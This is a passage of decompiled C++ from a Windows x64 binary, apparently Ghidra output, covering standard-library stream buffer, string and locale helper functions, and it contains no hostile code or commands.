    **(longlong **)(param_1 + 0x38) = lVar2;
    **(int **)(param_1 + 0x50) = (int)uVar1 - (int)lVar2;
  }
  if (param_1[0x7c] != (basic_streambuf<char,std::char_traits<char>_>)0x0) {
    FUN_140025450(param_1);
  }
                    /* WARNING: Could not recover jumptable at 0x000140024412. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  std::basic_streambuf<char,std::char_traits<char>_>::~basic_streambuf<char,std::char_traits<char>_>
            (param_1);
  return;
}



/* ==================================================================== */
/* FUN_140024420 @ 140024420 */

void FUN_140024420(longlong param_1)

{
  int iVar1;

  *(undefined ***)((longlong)*(int *)(*(longlong *)(param_1 + -0x88) + 4) + -0x88 + param_1) =
       &PTR_LAB_1400570c0;
  iVar1 = *(int *)(*(longlong *)(param_1 + -0x88) + 4);
  *(int *)((longlong)iVar1 + -0x8c + param_1) = iVar1 + -0x88;
  FUN_140024a90(param_1 + -0x80);
                    /* WARNING: Could not recover jumptable at 0x00014002446f. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  std::basic_ostream<char,std::char_traits<char>_>::~basic_ostream<char,std::char_traits<char>_>
            ((basic_ostream<char,std::char_traits<char>_> *)(param_1 + -0x78));
  return;
}



/* ==================================================================== */
/* FUN_140024480 @ 140024480 */

basic_ostream<char,std::char_traits<char>_> *
FUN_140024480(basic_ostream<char,std::char_traits<char>_> *param_1)

{
  *(undefined **)param_1 = &DAT_140056fe8;
  std::basic_ios<char,std::char_traits<char>_>::basic_ios<char,std::char_traits<char>_>
            ((basic_ios<char,std::char_traits<char>_> *)(param_1 + 0x88));
  std::basic_ostream<char,std::char_traits<char>_>::basic_ostream<char,std::char_traits<char>_>
            (param_1,(basic_streambuf<char,std::char_traits<char>_> *)(param_1 + 8),false);
  *(undefined ***)(param_1 + *(int *)(*(longlong *)param_1 + 4)) = &PTR_LAB_1400570c0;
  *(int *)(param_1 + (longlong)*(int *)(*(longlong *)param_1 + 4) + -4) =
       *(int *)(*(longlong *)param_1 + 4) + -0x88;
  std::basic_streambuf<char,std::char_traits<char>_>::basic_streambuf<char,std::char_traits<char>_>
            ((basic_streambuf<char,std::char_traits<char>_> *)(param_1 + 8));
  *(undefined ***)(param_1 + 8) = &PTR_FUN_140056f40;
  *(undefined8 *)(param_1 + 0x70) = 0;
  *(undefined4 *)(param_1 + 0x78) = 4;
  return param_1;
}



/* ==================================================================== */
/* FUN_140024530 @ 140024530 */

ulonglong * FUN_140024530(longlong param_1,ulonglong *param_2,longlong *param_3,uint param_4)

{
  longlong lVar1;
  int iVar2;
  longlong lVar3;
  longlong lVar4;
  longlong lVar5;
  undefined8 uVar6;
  bool bVar7;
  bool bVar8;
  ulonglong uVar9;
  ulonglong uVar10;

  if (((param_4 & 1) == 0) || ((*(byte *)(param_1 + 0x70) & 4) == 0)) {
    bVar7 = false;
  }
  else {
    bVar7 = true;
  }
  if (((param_4 & 2) == 0) || ((*(byte *)(param_1 + 0x70) & 2) == 0)) {
    bVar8 = false;
  }
  else {
    bVar8 = true;
  }
  if ((!bVar7) && (!bVar8)) {
    uVar10 = param_3[1] + *param_3;
    lVar3 = **(longlong **)(param_1 + 0x38);
    if ((*(byte *)(param_1 + 0x70) & 2) == 0) {
      uVar9 = **(ulonglong **)(param_1 + 0x40);
      if ((uVar9 != 0) && (*(ulonglong *)(param_1 + 0x68) < uVar9)) {
        *(ulonglong *)(param_1 + 0x68) = uVar9;
      }
    }
    else {
      uVar9 = 0;
    }
    lVar4 = *(longlong *)(param_1 + 0x68);
    lVar5 = **(longlong **)(param_1 + 0x18);
    if ((uVar10 <= (ulonglong)(lVar4 - lVar5)) &&
       ((uVar10 == 0 ||
        ((((param_4 & 1) == 0 || (lVar3 != 0)) && (((param_4 & 2) == 0 || (uVar9 != 0)))))))) {
      lVar1 = lVar5 + uVar10;
      if (((param_4 & 1) != 0) && (lVar3 != 0)) {
        **(longlong **)(param_1 + 0x38) = lVar1;
        **(int **)(param_1 + 0x50) = (int)lVar4 - (int)lVar1;
      }
      if (((param_4 & 2) != 0) && (uVar9 != 0)) {
        iVar2 = **(int **)(param_1 + 0x58);
        uVar6 = **(undefined8 **)(param_1 + 0x40);
        **(longlong **)(param_1 + 0x20) = lVar5;
        **(longlong **)(param_1 + 0x40) = lVar1;
        **(int **)(param_1 + 0x58) = (iVar2 + (int)uVar6) - (int)lVar1;
      }
      *param_2 = uVar10;
      goto LAB_140024633;
    }
  }
  *param_2 = 0xffffffffffffffff;
LAB_140024633:
  param_2[1] = 0;
  param_2[2] = 0;
  return param_2;
}



/* ==================================================================== */
/* FUN_140024650 @ 140024650 */

ulonglong *
FUN_140024650(longlong param_1,ulonglong *param_2,longlong param_3,int param_4,byte param_5)

{
  longlong lVar1;
  int iVar2;
  longlong lVar3;
  longlong lVar4;
  undefined8 uVar5;
  bool bVar6;
  bool bVar7;
  ulonglong uVar8;
  ulonglong uVar9;
  ulonglong uVar10;

  if (((param_5 & 1) == 0) || ((*(byte *)(param_1 + 0x70) & 4) == 0)) {
    bVar6 = false;
  }
  else {
    bVar6 = true;
  }
  if (((param_5 & 2) == 0) || ((*(byte *)(param_1 + 0x70) & 2) == 0)) {
    bVar7 = false;
  }
  else {
    bVar7 = true;
  }
  if ((bVar6) || (bVar7)) goto LAB_1400247b6;
  lVar3 = **(longlong **)(param_1 + 0x38);
  if ((*(byte *)(param_1 + 0x70) & 2) == 0) {
    uVar9 = **(ulonglong **)(param_1 + 0x40);
    if ((uVar9 != 0) && (*(ulonglong *)(param_1 + 0x68) < uVar9)) {
      *(ulonglong *)(param_1 + 0x68) = uVar9;
    }
  }
  else {
    uVar9 = 0;
  }
  lVar4 = **(longlong **)(param_1 + 0x18);
  uVar10 = *(longlong *)(param_1 + 0x68) - lVar4;
  if (param_4 == 0) {
    uVar8 = 0;
LAB_14002473a:
    uVar8 = uVar8 + param_3;
    if ((uVar8 <= uVar10) &&
       ((uVar8 == 0 ||
        ((((param_5 & 1) == 0 || (lVar3 != 0)) && (((param_5 & 2) == 0 || (uVar9 != 0)))))))) {
      lVar1 = uVar8 + lVar4;
      if (((param_5 & 1) != 0) && (lVar3 != 0)) {
        uVar5 = *(undefined8 *)(param_1 + 0x68);
        **(longlong **)(param_1 + 0x38) = lVar1;
        **(int **)(param_1 + 0x50) = (int)uVar5 - (int)lVar1;
      }
      if (((param_5 & 2) != 0) && (uVar9 != 0)) {
        iVar2 = **(int **)(param_1 + 0x58);
        uVar5 = **(undefined8 **)(param_1 + 0x40);
        **(longlong **)(param_1 + 0x20) = lVar4;
        **(longlong **)(param_1 + 0x40) = lVar1;
        **(int **)(param_1 + 0x58) = (iVar2 + (int)uVar5) - (int)lVar1;
      }
      *param_2 = uVar8;
      goto LAB_1400247bd;
    }
  }
  else if (param_4 == 1) {
    if ((param_5 & 3) != 3) {
      if ((param_5 & 1) == 0) {
        if (((param_5 & 2) != 0) && ((uVar9 != 0 || (lVar4 == 0)))) {
          uVar8 = uVar9 - lVar4;
          goto LAB_14002473a;
        }
      }
      else if ((lVar3 != 0) || (lVar4 == 0)) {
        uVar8 = lVar3 - lVar4;
        goto LAB_14002473a;
      }
    }
  }
  else if (param_4 == 2) {
    uVar8 = uVar10;
    goto LAB_14002473a;
  }
LAB_1400247b6:
  *param_2 = 0xffffffffffffffff;
LAB_1400247bd:
  param_2[1] = 0;
  param_2[2] = 0;
  return param_2;
}



/* ==================================================================== */
/* FUN_1400248a0 @ 1400248a0 */

int FUN_1400248a0(longlong param_1,int param_2)

{
  ulonglong uVar1;
  longlong lVar2;
  int iVar3;
  ulonglong uVar4;
  undefined1 *puVar5;
  undefined8 uVar6;
  void *pvVar7;
  longlong lVar8;
  size_t _Size;
  void *_Src;

  if ((*(byte *)(param_1 + 0x70) & 2) != 0) {
    return -1;
  }
  if (param_2 == -1) {
    return 0;
  }
  uVar4 = **(ulonglong **)(param_1 + 0x40);
  iVar3 = **(int **)(param_1 + 0x58);
  uVar1 = uVar4 + (longlong)iVar3;
  if (uVar4 == 0) {
    _Size = 0;
    _Src = (void *)**(longlong **)(param_1 + 0x18);
  }
  else {
    if (uVar4 < uVar1) {
      **(int **)(param_1 + 0x58) = iVar3 + -1;
      puVar5 = (undefined1 *)**(longlong **)(param_1 + 0x40);
      **(longlong **)(param_1 + 0x40) = (longlong)(puVar5 + 1);
      *puVar5 = (char)param_2;
      *(ulonglong *)(param_1 + 0x68) = uVar4 + 1;
      return param_2;
    }
    _Src = (void *)**(longlong **)(param_1 + 0x18);
    _Size = uVar1 - (longlong)_Src;
    if (0x1f < _Size) {
      if (_Size < 0x3fffffff) {
        lVar8 = _Size * 2;
      }
      else {
        lVar8 = 0x7fffffff;
        if (0x7ffffffe < _Size) {
          return -1;
        }
      }
      goto LAB_14002497a;
    }
  }
  lVar8 = 0x20;
LAB_14002497a:
  pvVar7 = (void *)FUN_14000e6b0(lVar8);
  memcpy(pvVar7,_Src,_Size);
  lVar2 = (longlong)pvVar7 + _Size;
  *(longlong *)(param_1 + 0x68) = lVar2 + 1;
  **(undefined8 **)(param_1 + 0x20) = pvVar7;
  **(longlong **)(param_1 + 0x40) = lVar2;
  **(int **)(param_1 + 0x58) = ((int)pvVar7 - (int)lVar2) + (int)lVar8;
  if ((*(byte *)(param_1 + 0x70) & 4) == 0) {
    uVar6 = *(undefined8 *)(param_1 + 0x68);
    lVar8 = (**(longlong **)(param_1 + 0x38) - (longlong)_Src) + (longlong)pvVar7;
    **(undefined8 **)(param_1 + 0x18) = pvVar7;
    **(longlong **)(param_1 + 0x38) = lVar8;
    **(int **)(param_1 + 0x50) = (int)uVar6 - (int)lVar8;
  }
  else {
    **(undefined8 **)(param_1 + 0x18) = pvVar7;
    **(undefined8 **)(param_1 + 0x38) = pvVar7;
    **(undefined4 **)(param_1 + 0x50) = 0;
  }
  if ((*(byte *)(param_1 + 0x70) & 1) != 0) {
    pvVar7 = _Src;
    if ((0xfff < _Size) &&
       (pvVar7 = *(void **)((longlong)_Src + -8),
       0x1f < (ulonglong)((longlong)_Src + (-8 - (longlong)pvVar7)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(pvVar7);
  }
  *(uint *)(param_1 + 0x70) = *(uint *)(param_1 + 0x70) | 1;
  **(int **)(param_1 + 0x58) = **(int **)(param_1 + 0x58) + -1;
  puVar5 = (undefined1 *)**(longlong **)(param_1 + 0x40);
  **(longlong **)(param_1 + 0x40) = (longlong)(puVar5 + 1);
  *puVar5 = (char)param_2;
  return param_2;
}



/* ==================================================================== */
/* FUN_140024a90 @ 140024a90 */

void FUN_140024a90(basic_streambuf<char,std::char_traits<char>_> *param_1)

{
  void *pvVar1;
  void *_Memory;
  longlong lVar2;

  *(undefined ***)param_1 = &PTR_FUN_140056f40;
  if (((byte)param_1[0x70] & 1) != 0) {
    if (**(longlong **)(param_1 + 0x40) == 0) {
      lVar2 = (longlong)**(int **)(param_1 + 0x50) + **(longlong **)(param_1 + 0x38);
    }
    else {
      lVar2 = (longlong)**(int **)(param_1 + 0x58) + **(longlong **)(param_1 + 0x40);
    }
    pvVar1 = (void *)**(longlong **)(param_1 + 0x18);
    _Memory = pvVar1;
    if ((0xfff < (ulonglong)(lVar2 - (longlong)pvVar1)) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
  }
  **(undefined8 **)(param_1 + 0x18) = 0;
  **(undefined8 **)(param_1 + 0x38) = 0;
  **(undefined4 **)(param_1 + 0x50) = 0;
  **(undefined8 **)(param_1 + 0x20) = 0;
  **(undefined8 **)(param_1 + 0x40) = 0;
  **(undefined4 **)(param_1 + 0x58) = 0;
  *(uint *)(param_1 + 0x70) = *(uint *)(param_1 + 0x70) & 0xfffffffe;
  *(undefined8 *)(param_1 + 0x68) = 0;
                    /* WARNING: Could not recover jumptable at 0x000140024b39. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  std::basic_streambuf<char,std::char_traits<char>_>::~basic_streambuf<char,std::char_traits<char>_>
            (param_1);
  return;
}



/* ==================================================================== */
/* FUN_140024b60 @ 140024b60 */

void * FUN_140024b60(longlong param_1,ulonglong param_2)

{
  void *_Memory;

  _Memory = (void *)(param_1 + -0xa8);
  FUN_1400199c0(_Memory);
  if ((param_2 & 1) != 0) {
    free(_Memory);
  }
  return _Memory;
}



/* ==================================================================== */
/* FUN_140024ba0 @ 140024ba0 */

void * FUN_140024ba0(void *param_1,ulonglong param_2)

{
  FUN_1400243b0();
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140024be0 @ 140024be0 */

void * FUN_140024be0(longlong param_1,ulonglong param_2)

{
  void *_Memory;

  _Memory = (void *)(param_1 + -0x88);
  FUN_140019960(_Memory);
  if ((param_2 & 1) != 0) {
    free(_Memory);
  }
  return _Memory;
}



/* ==================================================================== */
/* FUN_140024c20 @ 140024c20 */

void * FUN_140024c20(void *param_1,ulonglong param_2)

{
  FUN_140024a90();
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140024c60 @ 140024c60 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_140024c60(longlong *param_1)

{
  code *pcVar1;
  undefined1 auStack_38 [32];
  _Lockit local_18 [8];
  ulonglong local_10;

  local_10 = DAT_14005d040 ^ (ulonglong)auStack_38;
  if (*param_1 != 0) {
    return *param_1;
  }
  std::_Lockit::_Lockit(local_18,0);
  pcVar1 = _Id_cnt_exref;
  if (*param_1 == 0) {
    *(int *)_Id_cnt_exref = *(int *)_Id_cnt_exref + 1;
    *param_1 = (longlong)*(int *)pcVar1;
  }
  std::_Lockit::~_Lockit(local_18);
  return *param_1;
}



/* ==================================================================== */
/* FUN_140024ce0 @ 140024ce0 */

void FUN_140024ce0(undefined8 *param_1,void *param_2,size_t param_3)

{
  ulonglong uVar1;
  void *_Dst;
  ulonglong uVar2;

  if (0x7fffffffffffffff < param_3) {
                    /* WARNING: Subroutine does not return */
    FUN_14000eb00();
  }
  if (param_3 < 0x10) {
    param_1[2] = param_3;
    param_1[3] = 0xf;
    memcpy(param_1,param_2,param_3);
    *(undefined1 *)(param_3 + (longlong)param_1) = 0;
    return;
  }
  uVar1 = param_3 | 0xf;
  uVar2 = 0x7fffffffffffffff;
  if ((uVar1 < 0x8000000000000000) && (uVar2 = uVar1, uVar1 < 0x16)) {
    uVar2 = 0x16;
  }
  _Dst = (void *)FUN_14000e6b0(uVar2 + 1);
  *param_1 = _Dst;
  param_1[2] = param_3;
  param_1[3] = uVar2;
  memcpy(_Dst,param_2,param_3);
  *(undefined1 *)(param_3 + (longlong)_Dst) = 0;
  return;
}



/* ==================================================================== */
/* FUN_140024d90 @ 140024d90 */

undefined8 * FUN_140024d90(undefined8 *param_1)

{
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  return param_1;
}



/* ==================================================================== */
/* FUN_140024db0 @ 140024db0 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

facet * FUN_140024db0(locale *param_1)

{
  longlong lVar1;
  ulonglong uVar2;
  _Locimp *p_Var3;
  __uint64 _Var4;
  facet *pfVar5;
  undefined1 auStack_48 [32];
  facet *local_28;
  facet *local_20;
  _Lockit local_18 [8];
  ulonglong local_10;

  local_10 = DAT_14005d040 ^ (ulonglong)auStack_48;
  std::_Lockit::_Lockit(local_18,0);
  local_20 = DAT_140a61898;
  uVar2 = FUN_140024c60(id_exref);
  lVar1 = *(longlong *)(param_1 + 8);
  if (uVar2 < *(ulonglong *)(lVar1 + 0x18)) {
    pfVar5 = *(facet **)(uVar2 * 8 + *(longlong *)(lVar1 + 0x10));
    if (pfVar5 != (facet *)0x0) goto LAB_140024e86;
  }
  else {
    pfVar5 = (facet *)0x0;
  }
  if (*(char *)(lVar1 + 0x24) == '\0') {
LAB_140024e3c:
    if (pfVar5 != (facet *)0x0) goto LAB_140024e86;
  }
  else {
    p_Var3 = std::locale::_Getgloballocale();
    if (uVar2 < *(ulonglong *)(p_Var3 + 0x18)) {
      pfVar5 = *(facet **)(uVar2 * 8 + *(longlong *)(p_Var3 + 0x10));
      goto LAB_140024e3c;
    }
  }
  pfVar5 = local_20;
  if (local_20 == (facet *)0x0) {
    _Var4 = std::codecvt<char,char,_Mbstatet>::_Getcat(&local_20,param_1);
    pfVar5 = local_20;
    if (_Var4 == 0xffffffffffffffff) {
                    /* WARNING: Subroutine does not return */
      FUN_14000f050();
    }
    local_28 = local_20;
    FUN_1400514b8(local_20);
    (**(code **)(*(longlong *)pfVar5 + 8))(pfVar5);
    DAT_140a61898 = local_20;
    pfVar5 = local_20;
  }
LAB_140024e86:
  std::_Lockit::~_Lockit(local_18);
  return pfVar5;
}



/* ==================================================================== */
/* FUN_140024ec0 @ 140024ec0 */

void FUN_140024ec0(longlong *param_1)

{
  longlong lVar1;
  void *pvVar2;
  longlong lVar3;
  void *_Memory;

  lVar3 = *param_1;
  if (lVar3 != 0) {
    lVar1 = param_1[1];
    for (; lVar3 != lVar1; lVar3 = lVar3 + 0x30) {
      FUN_14000e3a0(lVar3 + 0x18);
      FUN_14000e300(lVar3);
    }
    pvVar2 = (void *)*param_1;
    _Memory = pvVar2;
    if ((0xfff < (ulonglong)(((param_1[2] - (longlong)pvVar2) / 0x30) * 0x30)) &&
       (_Memory = *(void **)((longlong)pvVar2 + -8),
       0x1f < (ulonglong)((longlong)pvVar2 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
    *param_1 = 0;
    param_1[1] = 0;
    param_1[2] = 0;
  }
  return;
}



/* ==================================================================== */
/* FUN_140024f90 @ 140024f90 */

void FUN_140024f90(longlong *param_1)

{
  longlong *plVar1;
  int iVar2;

  iVar2 = std::uncaught_exceptions();
  if (iVar2 == 0) {
    std::basic_ostream<char,std::char_traits<char>_>::_Osfx
              ((basic_ostream<char,std::char_traits<char>_> *)*param_1);
  }
  plVar1 = *(longlong **)((longlong)*(int *)(*(longlong *)*param_1 + 4) + 0x48 + *param_1);
  if (plVar1 != (longlong *)0x0) {
    (**(code **)(*plVar1 + 0x10))();
  }
  return;
}



/* ==================================================================== */
/* FUN_140024ff0 @ 140024ff0 */

undefined8 * FUN_140024ff0(undefined8 *param_1)

{
  if ((ulonglong)param_1[3] < 0x10) {
    return param_1;
  }
  return (undefined8 *)*param_1;
}



/* ==================================================================== */
/* FUN_140025000 @ 140025000 */

void FUN_140025000(longlong *param_1)

{
  void *pvVar1;
  void *_Memory;

  if (0xf < (ulonglong)param_1[3]) {
    pvVar1 = (void *)*param_1;
    _Memory = pvVar1;
    if ((0xfff < param_1[3] + 1U) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
  }
  param_1[2] = 0;
  param_1[3] = 0xf;
  *(undefined1 *)param_1 = 0;
  return;
}



/* ==================================================================== */
/* FUN_140025080 @ 140025080 */

longlong FUN_140025080(undefined8 *param_1,void *param_2)

{
  size_t _Size;
  int iVar1;
  size_t sVar2;
  uint7 uVar3;
  undefined4 extraout_var;

  sVar2 = 0xffffffffffffffff;
  do {
    sVar2 = sVar2 + 1;
  } while (*(char *)((longlong)param_2 + sVar2) != '\0');
  _Size = param_1[2];
  if (0xf < (ulonglong)param_1[3]) {
    param_1 = (undefined8 *)*param_1;
  }
  uVar3 = (uint7)(sVar2 >> 8);
  if (_Size != sVar2) {
    return (ulonglong)uVar3 << 8;
  }
  if (_Size == 0) {
    return CONCAT71(uVar3,1);
  }
  iVar1 = memcmp(param_1,param_2,_Size);
  return CONCAT71((int7)(CONCAT44(extraout_var,iVar1) >> 8),iVar1 == 0);
}



/* ==================================================================== */
/* FUN_1400250d0 @ 1400250d0 */

longlong FUN_1400250d0(undefined8 *param_1,undefined8 *param_2)

{
  size_t *psVar1;
  size_t _Size;
  int iVar2;
  uint7 uVar3;
  undefined4 extraout_var;

  psVar1 = param_2 + 2;
  if (0xf < (ulonglong)param_2[3]) {
    param_2 = (undefined8 *)*param_2;
  }
  _Size = param_1[2];
  if (0xf < (ulonglong)param_1[3]) {
    param_1 = (undefined8 *)*param_1;
  }
  uVar3 = (uint7)(*psVar1 >> 8);
  if (_Size != *psVar1) {
    return (ulonglong)uVar3 << 8;
  }
  if (_Size == 0) {
    return CONCAT71(uVar3,1);
  }
  iVar2 = memcmp(param_1,param_2,_Size);
  return CONCAT71((int7)(CONCAT44(extraout_var,iVar2) >> 8),iVar2 == 0);
}



/* ==================================================================== */
/* FUN_140025120 @ 140025120 */

undefined8 * FUN_140025120(undefined8 *param_1,void *param_2,ulonglong param_3)

{
  longlong lVar1;
  ulonglong uVar2;
  undefined8 *puVar3;

  lVar1 = param_1[2];
  uVar2 = param_1[3];
  if (uVar2 - lVar1 < param_3) {
    puVar3 = (undefined8 *)FUN_140025940(param_1,param_3,uVar2,param_2,param_3);
    return puVar3;
  }
  param_1[2] = lVar1 + param_3;
  puVar3 = param_1;
  if (0xf < uVar2) {
    puVar3 = (undefined8 *)*param_1;
  }
  memmove((void *)((longlong)puVar3 + lVar1),param_2,param_3);
  *(undefined1 *)((longlong)puVar3 + lVar1 + param_3) = 0;
  return param_1;
}



/* ==================================================================== */
/* FUN_1400251a0 @ 1400251a0 */

undefined8 *
FUN_1400251a0(undefined8 *param_1,undefined8 param_2,undefined8 *param_3,undefined8 *param_4)

{
  ulonglong uVar1;
  ulonglong _Size;
  ulonglong uVar2;
  undefined8 uVar3;
  undefined8 *puVar4;
  ulonglong uVar5;
  void *pvVar6;
  ulonglong uVar7;

  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  _Size = param_3[2];
  uVar2 = param_4[2];
  uVar1 = _Size + uVar2;
  if ((param_3[3] - _Size < uVar2) || ((ulonglong)param_3[3] < (ulonglong)param_4[3])) {
    if (param_4[3] - uVar2 < _Size) {
      if (0x7fffffffffffffff - _Size < uVar2) {
                    /* WARNING: Subroutine does not return */
        FUN_14000eb00();
      }
      uVar5 = uVar1 | 0xf;
      uVar7 = 0x7fffffffffffffff;
      if ((uVar5 < 0x8000000000000000) && (uVar7 = uVar5, uVar5 < 0x16)) {
        uVar7 = 0x16;
      }
      pvVar6 = (void *)FUN_14000e6b0(uVar7 + 1);
      *param_1 = pvVar6;
      param_1[2] = uVar1;
      param_1[3] = uVar7;
      if (0xf < (ulonglong)param_3[3]) {
        param_3 = (undefined8 *)*param_3;
      }
      memcpy(pvVar6,param_3,_Size);
      if (0xf < (ulonglong)param_4[3]) {
        param_4 = (undefined8 *)*param_4;
      }
      memcpy((void *)((longlong)pvVar6 + _Size),param_4,uVar2 + 1);
    }
    else {
      uVar3 = param_4[1];
      *param_1 = *param_4;
      param_1[1] = uVar3;
      uVar3 = param_4[3];
      param_1[2] = param_4[2];
      param_1[3] = uVar3;
      *(undefined1 *)param_4 = 0;
      param_4[2] = 0;
      param_4[3] = 0xf;
      pvVar6 = (void *)*param_1;
      memmove((void *)((longlong)pvVar6 + _Size),pvVar6,uVar2 + 1);
      if (0xf < (ulonglong)param_3[3]) {
        param_3 = (undefined8 *)*param_3;
      }
      memcpy(pvVar6,param_3,_Size);
      param_1[2] = uVar1;
    }
  }
  else {
    uVar3 = param_3[1];
    *param_1 = *param_3;
    param_1[1] = uVar3;
    uVar3 = param_3[3];
    param_1[2] = param_3[2];
    param_1[3] = uVar3;
    *(undefined1 *)param_3 = 0;
    param_3[2] = 0;
    param_3[3] = 0xf;
    puVar4 = param_1;
    if (0xf < (ulonglong)param_1[3]) {
      puVar4 = (undefined8 *)*param_1;
    }
    if (0xf < (ulonglong)param_4[3]) {
      param_4 = (undefined8 *)*param_4;
    }
    memcpy((void *)((longlong)puVar4 + _Size),param_4,uVar2 + 1);
    param_1[2] = uVar1;
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_140025340 @ 140025340 */

void FUN_140025340(undefined1 *param_1)

{
  *(undefined8 *)(param_1 + 0x10) = 0;
  *(undefined8 *)(param_1 + 0x18) = 0xf;
  *param_1 = 0;
  return;
}



/* ==================================================================== */
/* FUN_140025360 @ 140025360 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

bool FUN_140025360(longlong *param_1)

{
  int iVar1;
  size_t sVar2;
  size_t _Count;
  undefined1 auStackY_68 [32];
  char *local_38;
  char local_30 [32];
  ulonglong local_10;

  local_10 = DAT_14005d040 ^ (ulonglong)auStackY_68;
  if ((param_1[0xd] == 0) || (*(char *)((longlong)param_1 + 0x71) == '\0')) {
    return true;
  }
  iVar1 = (**(code **)(*param_1 + 0x18))(param_1,0xffffffff);
  if (iVar1 != -1) {
    iVar1 = std::codecvt<char,char,_Mbstatet>::unshift
                      ((codecvt<char,char,_Mbstatet> *)param_1[0xd],
                       (_Mbstatet *)((longlong)param_1 + 0x74),local_30,(char *)&local_10,&local_38)
    ;
    if (iVar1 == 0) {
      *(undefined1 *)((longlong)param_1 + 0x71) = 0;
    }
    else if (iVar1 != 1) {
      if (iVar1 == 3) {
        *(undefined1 *)((longlong)param_1 + 0x71) = 0;
        return true;
      }
      return false;
    }
    _Count = (longlong)local_38 - (longlong)local_30;
    if ((_Count == 0) || (sVar2 = fwrite(local_30,1,_Count,(FILE *)param_1[0x10]), _Count == sVar2))
    {
      return *(char *)((longlong)param_1 + 0x71) == '\0';
    }
  }
  return false;
}



/* ==================================================================== */
/* FUN_140025450 @ 140025450 */

basic_streambuf<char,std::char_traits<char>_> *
FUN_140025450(basic_streambuf<char,std::char_traits<char>_> *param_1)

{
  undefined8 uVar1;
  longlong lVar2;
  char cVar3;
  int iVar4;
  basic_streambuf<char,std::char_traits<char>_> *pbVar5;
  basic_streambuf<char,std::char_traits<char>_> *pbVar6;

  if (*(longlong *)(param_1 + 0x80) == 0) {
    pbVar6 = (basic_streambuf<char,std::char_traits<char>_> *)0x0;
  }
  else {
    if ((basic_streambuf<char,std::char_traits<char>_> *)**(longlong **)(param_1 + 0x18) ==
        param_1 + 0x70) {
      uVar1 = *(undefined8 *)(param_1 + 0x90);
      lVar2 = *(longlong *)(param_1 + 0x88);
      **(longlong **)(param_1 + 0x18) = lVar2;
      **(longlong **)(param_1 + 0x38) = lVar2;
      **(int **)(param_1 + 0x50) = (int)uVar1 - (int)lVar2;
    }
    cVar3 = FUN_140025360(param_1);
    pbVar5 = (basic_streambuf<char,std::char_traits<char>_> *)0x0;
    if (cVar3 != '\0') {
      pbVar5 = param_1;
    }
    iVar4 = fclose(*(FILE **)(param_1 + 0x80));
    pbVar6 = (basic_streambuf<char,std::char_traits<char>_> *)0x0;
    if (iVar4 == 0) {
      pbVar6 = pbVar5;
    }
  }
  param_1[0x7c] = (basic_streambuf<char,std::char_traits<char>_>)0x0;
  param_1[0x71] = (basic_streambuf<char,std::char_traits<char>_>)0x0;
  std::basic_streambuf<char,std::char_traits<char>_>::_Init(param_1);
  *(undefined8 *)(param_1 + 0x74) = DAT_140a61890;
  *(undefined8 *)(param_1 + 0x80) = 0;
  *(undefined8 *)(param_1 + 0x68) = 0;
  return pbVar6;
}



/* ==================================================================== */
/* FUN_140025510 @ 140025510 */

undefined8 * FUN_140025510(longlong param_1,undefined8 *param_2,undefined8 param_3,longlong param_4)

{
  longlong lVar1;
  ulonglong uVar3;
  longlong lVar2;

  *param_2 = 0;
  param_2[1] = 0;
  param_2[2] = 0;
  param_2[3] = 0xf;
  *(undefined1 *)param_2 = 0;
  if ((((byte)*(uint *)(param_1 + 0x70) & 0x22) == 2) ||
     (uVar3 = **(ulonglong **)(param_1 + 0x40), uVar3 == 0)) {
    if (((*(uint *)(param_1 + 0x70) & 4) == 0) &&
       (param_4 = **(longlong **)(param_1 + 0x38), param_4 != 0)) {
      lVar1 = **(longlong **)(param_1 + 0x18);
      lVar2 = (**(int **)(param_1 + 0x50) - lVar1) + param_4;
    }
    else {
      lVar2 = 0;
      lVar1 = 0;
    }
  }
  else {
    lVar1 = **(longlong **)(param_1 + 0x20);
    if (uVar3 < *(ulonglong *)(param_1 + 0x68)) {
      uVar3 = *(ulonglong *)(param_1 + 0x68);
    }
    lVar2 = uVar3 - lVar1;
  }
  if (lVar1 != 0) {
    FUN_140025ad0(param_2,lVar1,lVar2,param_4,1);
  }
  return param_2;
}



/* ==================================================================== */
/* FUN_1400255c0 @ 1400255c0 */

uint FUN_1400255c0(undefined8 param_1,undefined8 param_2,uint param_3,uint param_4)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  longlong lVar4;

  param_3 = param_3 ^ 0x80000000;
  iVar3 = (param_4 ^ 0x80000000) - param_3;
  if (iVar3 == -1) {
    iVar3 = FUN_140025d90(param_2);
    return iVar3 + param_3 ^ 0x80000000;
  }
  uVar2 = iVar3 + 1;
  uVar1 = FUN_140025d90(param_2);
  lVar4 = (ulonglong)uVar1 * (ulonglong)uVar2;
  uVar1 = (uint)lVar4;
  if (uVar1 < uVar2) {
    while (uVar1 < -uVar2 % uVar2) {
      uVar1 = FUN_140025d90(param_2);
      lVar4 = (ulonglong)uVar1 * (ulonglong)uVar2;
